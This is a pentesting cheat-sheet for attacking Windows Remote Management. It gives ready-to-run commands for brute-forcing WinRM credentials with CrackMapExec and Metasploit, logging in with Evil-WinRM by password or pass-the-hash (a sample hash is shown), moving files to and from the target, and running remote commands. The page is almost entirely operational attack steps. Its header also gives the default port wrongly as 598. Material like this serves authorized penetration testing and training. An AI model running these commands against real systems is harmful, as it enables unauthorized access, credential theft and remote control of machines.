---
title: Windows Remote Management (WinRM) Pentesting
desc: Default port is 598, 5986.
tags: [598, 5986, CrackMapExec, Windows, WinRM]
alts: [Privilege-Escalation-Windows]
render_with_liquid: false
---

## 1. Enumeration

1. **Brute Force Credentials**

    ```sh
    crackmapexec winrm <target-ip> -d DomainName -u usernames.txt -p passwords.txt
    ```

    Or using Metasploit

    ```sh
    msfconsole
    msf > use auxiliary/scanner/winrm/winrm_login
    ```

<br />

## 2. Connect and Exploit

1. **Use Evil-WinRM**

    **[Evil-WinRM](https://github.com/Hackplayers/evil-winrm){:target="_blank"}** is a Windows Remote Management shell for pentesting.

    1. **Connect**

        ```powershell
        # Evil-WinRM
        evil-winrm -i <target-ip> -P 5985 -u username -p password
        # Pass The Hash (-H)
        evil-winrm -i <target-ip> -P 5985 -u username -H 0e0363213e37b94221497260b0bcb4fc
        # PowerShell Local Path (-s)
        evil-winrm -i <target-ip> -u username -p password -s /opt/scripts
        ```

    2. **File Transfering**

        After connecting, you can use a lot of useful commands to exploit.

        ```powershell
        # Upload a local file to Windows machine
        PS> upload ./example.bat c:\\Users\Administrator\Desktop\exploit.bat

        # Download a file to local
        PS> download c:\\Users\Administrator\Desktop\example.txt ./example.txt
        ```

2. **Use CrackMapExec**

    **[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec){:target="_blank"}** is a swiss army knife for pentesting networks.

    ```sh
    # Login and CMD execution (-x)
    crackmapexec winrm <target-ip> -d DomainName -u username -p password -x 'whoami'
    # Login and PowerShell execution (-X)
    crackmapexec winrm <target-ip> -d DomainName -u username -p password -X '$PSVersionTable'

    # Pass the Hash and CMD execution (-x)
    crackmapexec winrm <target-ip> -d DomainName -u username -H <HASH> -x 'whoami'
    # Pass the Hash and PowerShell execution (-X)
    crackmapexec winrm <target-ip> -d DomainName -u username -H <HASH> -X '$PSVersionTable'
    ```